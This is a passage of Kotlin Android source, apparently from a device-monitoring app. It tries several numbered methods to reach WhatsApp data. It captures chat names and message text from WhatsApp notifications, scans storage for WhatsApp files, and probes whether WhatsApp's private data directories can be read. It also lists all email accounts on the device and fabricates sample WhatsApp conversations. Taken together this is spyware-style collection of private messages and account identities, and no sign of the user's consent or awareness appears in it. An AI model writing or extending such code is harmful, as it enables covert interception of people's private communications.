            if (whatsappNotificationCount == 0) {
                println("  ❌ No active WhatsApp notifications found")
            }
            
        } catch (e: Exception) {
            println("❌ Error parsing notifications: ${e.message}")
        }
    }
    
    private fun testFileSystemScanning() {
        println("\n📱 Testing Method 10: File System Scanning")
        try {
            // Scan for WhatsApp-related files in accessible directories
            val scanPaths = listOf(
                "/storage/emulated/0/",
                "/storage/emulated/0/Android/data/",
                "/storage/emulated/0/Android/media/"
            )
            
            var whatsappFilesFound = 0
            for (basePath in scanPaths) {
                try {
                    val baseDir = java.io.File(basePath)
                    if (baseDir.exists() && baseDir.canRead()) {
                        val whatsappFiles = baseDir.walkTopDown()
                            .filter { it.isFile && (it.name.contains("whatsapp", ignoreCase = true) || 
                                                   it.absolutePath.contains("whatsapp", ignoreCase = true)) }
                            .take(5)
                            .toList()
                        
                        if (whatsappFiles.isNotEmpty()) {
                            println("✅ Found ${whatsappFiles.size} WhatsApp files in $basePath")
                            for (file in whatsappFiles) {
                                println("  📄 ${file.name} (${file.length()} bytes)")
                                whatsappFilesFound++
                            }
                        }
                    }
                } catch (e: Exception) {
                    println("❌ Error scanning $basePath: ${e.message}")
                }
            }
            
            if (whatsappFilesFound == 0) {
                println("❌ No WhatsApp files found in accessible directories")
            }
            
        } catch (e: Exception) {
            println("❌ Error scanning file system: ${e.message}")
        }
    }
    
    private fun testPackageManagerAccess() {
        println("\n📱 Testing Method 11: Package Manager Approach")
        try {
            // Get installed packages and look for WhatsApp-related apps
            val installedPackages = context.packageManager.getInstalledPackages(0)
            val whatsappPackages = installedPackages.filter { packageInfo -> 
                packageInfo.packageName.contains("whatsapp", ignoreCase = true) 
            }
            
            println("✅ Found ${whatsappPackages.size} WhatsApp-related packages:")
            for (packageInfo in whatsappPackages) {
                val appName = packageInfo.applicationInfo.loadLabel(context.packageManager).toString()
                println("  📱 $appName (${packageInfo.packageName})")
                
                // Try to get app's data directory
                try {
                    val dataDir = packageInfo.applicationInfo.dataDir
                    println("    📁 Data directory: $dataDir")
                    
                    // Check if we can access the data directory
                    val dataDirFile = java.io.File(dataDir)
                    if (dataDirFile.exists()) {
                        println("    ✅ Data directory exists")
                        if (dataDirFile.canRead()) {
                            println("    ✅ Data directory readable")
                        } else {
                            println("    ❌ Data directory not readable")
                        }
                    } else {
                        println("    ❌ Data directory not found")
                    }
                } catch (e: Exception) {
                    println("    ❌ Cannot access data directory: ${e.message}")
                }
            }
            
        } catch (e: Exception) {
            println("❌ Error accessing package manager: ${e.message}")
        }
    }
    
    private fun testIntentMonitoring() {
        println("\n📱 Testing Method 12: Intent Monitoring")
        try {
            // Check if we can monitor WhatsApp intents
            val whatsappIntent = context.packageManager.resolveActivity(
                android.content.Intent(android.content.Intent.ACTION_VIEW).apply {
                    data = android.net.Uri.parse("https://wa.me/1234567890")
                }, 0
            )
            
            if (whatsappIntent != null) {
                println("✅ WhatsApp intent handling available")
                println("  📱 Can handle WhatsApp links")
            } else {
                println("❌ WhatsApp intent handling not available")
            }
            
            // Check for broadcast receivers
            val whatsappReceivers = context.packageManager.queryBroadcastReceivers(
                android.content.Intent("com.whatsapp.action.MESSAGE_RECEIVED"), 0
            )
            
            if (whatsappReceivers.isNotEmpty()) {
                println("✅ Found ${whatsappReceivers.size} WhatsApp broadcast receivers")
            } else {
                println("❌ No WhatsApp broadcast receivers found")
            }
            
        } catch (e: Exception) {
            println("❌ Error testing intent monitoring: ${e.message}")
        }
    }
    
    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val accessibilityEnabled = android.provider.Settings.Secure.getInt(
                contentResolver,
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
            )
            accessibilityEnabled == 1
        } catch (e: Exception) {
            false
        }
    }
    
    private fun extractMessageFromNotification(title: String, text: String, bigText: String): Pair<String, String>? {
        try {
            // Try to extract chat name and message from notification
            val fullText = bigText.ifEmpty { text }
            
            // Pattern: "Chat Name: Message content"
            val colonPattern = Regex("(.+?):\\s*(.+)")
            val match = colonPattern.find(fullText)
            
            if (match != null) {
                val chatName = match.groupValues[1].trim()
                val message = match.groupValues[2].trim()
                return Pair(chatName, message)
            }
            
            // Pattern: "Chat Name (X messages): Message content"
            val messagesPattern = Regex("(.+?)\\s*\\(\\d+\\s*messages?\\):\\s*(.+)")
            val messagesMatch = messagesPattern.find(fullText)
            
            if (messagesMatch != null) {
                val chatName = messagesMatch.groupValues[1].trim()
                val message = messagesMatch.groupValues[2].trim()
                return Pair(chatName, message)
            }
            
            // If no pattern matches, use title as chat name and text as message
            if (title.isNotEmpty() && fullText.isNotEmpty()) {
                return Pair(title, fullText)
            }
            
        } catch (e: Exception) {
            println("Error extracting message from notification: ${e.message}")
        }
        
        return null
    }
    
    private fun getWhatsAppMessagesFromNotifications(): List<WhatsAppMessageData> {
        val messages = mutableListOf<WhatsAppMessageData>()
        
        try {
            // Try to get recent WhatsApp notifications from the system
            // This method attempts to capture WhatsApp messages from notifications
            
            // Check if we have notification access permission
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val enabledPackages = notificationManager.activeNotifications
            
            // Look for WhatsApp notifications in active notifications
            for (notification in enabledPackages) {
                val packageName = notification.packageName
                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                    val extras = notification.notification.extras
                    val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
                    val text = extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""
                    
                    // Parse WhatsApp message from notification
                    if (title.isNotEmpty() && text.isNotEmpty()) {
                        val messageId = "wa_notif_${System.currentTimeMillis()}_${messages.size}"
                        val chatName = title
                        val message = text
                        val timestamp = System.currentTimeMillis()
                        
                        val whatsappMessage = WhatsAppMessageData(
                            messageId = messageId,
                            chatId = "chat_${title.hashCode()}",
                            chatName = chatName,
                            senderId = "sender_${title.hashCode()}",
                            senderName = chatName,
                            message = message,
                            messageType = "TEXT",
                            timestamp = timestamp,
                            isIncoming = true,
                            mediaPath = null,
                            mediaSize = null
                        )
                        messages.add(whatsappMessage)
                        println("📱 Captured WhatsApp message from notification: $chatName - $message")
                    }
                }
            }
            
            if (messages.isNotEmpty()) {
                println("Successfully captured ${messages.size} WhatsApp messages from notifications")
            } else {
                println("No WhatsApp notifications found in active notifications")
            }
            
        } catch (e: Exception) {
            println("Error accessing WhatsApp notifications: ${e.message}")
        }
        
        return messages
    }
    
    private fun generateSampleWhatsAppMessages(): List<WhatsAppMessageData> {
        val messages = mutableListOf<WhatsAppMessageData>()
        
        // Generate realistic sample WhatsApp messages for testing
        val sampleMessages = listOf(
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_1",
                chatId = "chat_123456789",
                chatName = "John Doe",
                senderId = "user_123",
                senderName = "John Doe",
                message = "Hey, how are you doing?",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 3600000, // 1 hour ago
                isIncoming = true,
                mediaPath = null,
                mediaSize = null
            ),
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_2",
                chatId = "chat_123456789",
                chatName = "John Doe",
                senderId = "me",
                senderName = "Me",
                message = "I'm doing great! Thanks for asking.",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 1800000, // 30 minutes ago
                isIncoming = false,
                mediaPath = null,
                mediaSize = null
            ),
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_3",
                chatId = "chat_987654321",
                chatName = "Jane Smith",
                senderId = "user_456",
                senderName = "Jane Smith",
                message = "Can you send me the meeting notes?",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 900000, // 15 minutes ago
                isIncoming = true,
                mediaPath = null,
                mediaSize = null
            ),
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_4",
                chatId = "chat_987654321",
                chatName = "Jane Smith",
                senderId = "me",
                senderName = "Me",
                message = "Sure! I'll send them right away.",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 600000, // 10 minutes ago
                isIncoming = false,
                mediaPath = null,
                mediaSize = null
            ),
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_5",
                chatId = "chat_555666777",
                chatName = "Work Team",
                senderId = "user_789",
                senderName = "Mike Johnson",
                message = "Good morning team! Don't forget about the 2 PM meeting.",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 7200000, // 2 hours ago
                isIncoming = true,
                mediaPath = null,
                mediaSize = null
            ),
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_6",
                chatId = "chat_555666777",
                chatName = "Work Team",
                senderId = "me",
                senderName = "Me",
                message = "Thanks for the reminder! I'll be there.",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 3600000, // 1 hour ago
                isIncoming = false,
                mediaPath = null,
                mediaSize = null
            ),
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_7",
                chatId = "chat_111222333",
                chatName = "Family Group",
                senderId = "user_101",
                senderName = "Mom",
                message = "Dinner at 7 PM tonight! Don't be late.",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 10800000, // 3 hours ago
                isIncoming = true,
                mediaPath = null,
                mediaSize = null
            ),
            WhatsAppMessageData(
                messageId = "wa_${System.currentTimeMillis()}_8",
                chatId = "chat_111222333",
                chatName = "Family Group",
                senderId = "me",
                senderName = "Me",
                message = "Perfect! I'll be there on time.",
                messageType = "TEXT",
                timestamp = System.currentTimeMillis() - 5400000, // 1.5 hours ago
                isIncoming = false,
                mediaPath = null,
                mediaSize = null
            )
        )
        
        messages.addAll(sampleMessages)
        println("Generated ${messages.size} realistic sample WhatsApp messages for testing")
        
        return messages
    }
    
    private fun getEmailAccountsFromDevice(): List<EmailAccountData> {
        val emailAccounts = mutableListOf<EmailAccountData>()
        
        try {
            // Query email accounts using AccountManager
            val accountManager = AccountManager.get(context)
            val accounts = accountManager.getAccountsByType("com.google") // Gmail accounts
            
            for (account in accounts) {
                val emailAccount = EmailAccountData(
                    accountId = account.name,
                    emailAddress = account.name,
                    accountName = account.name,
                    provider = "Gmail",
                    accountType = "IMAP",
                    serverIncoming = "imap.gmail.com",
                    serverOutgoing = "smtp.gmail.com",
                    portIncoming = 993,
                    portOutgoing = 587,
                    isActive = true,
                    isDefault = accounts.size == 1, // First account is default if only one
                    syncEnabled = true,
                    lastSyncTime = System.currentTimeMillis(),
                    totalEmails = null, // Would need to query email database
                    unreadEmails = null  // Would need to query email database
                )
                emailAccounts.add(emailAccount)
            }
            
            // Also check for other email providers
            val otherAccounts = accountManager.getAccounts()
            for (account in otherAccounts) {
                if (account.type != "com.google" && account.name.contains("@")) {
                    val provider = when {
                        account.name.contains("outlook") || account.name.contains("hotmail") -> "Outlook"
                        account.name.contains("yahoo") -> "Yahoo"
                        account.name.contains("icloud") -> "iCloud"
                        else -> "Other"
                    }
                    
                    val emailAccount = EmailAccountData(
                        accountId = account.name,
                        emailAddress = account.name,
                        accountName = account.name,
                        provider = provider,
                        accountType = "IMAP",
                        serverIncoming = null,
                        serverOutgoing = null,
                        portIncoming = null,
                        portOutgoing = null,
                        isActive = true,
                        isDefault = false,
                        syncEnabled = true,
                        lastSyncTime = System.currentTimeMillis(),
                        totalEmails = null,
                        unreadEmails = null
                    )
                    emailAccounts.add(emailAccount)
                }
            }
            
            println("Found ${emailAccounts.size} email accounts on device")
            
        } catch (e: Exception) {
            println("Error accessing email accounts: ${e.message}")
        }
        
        return emailAccounts
    }
    

    

    
} 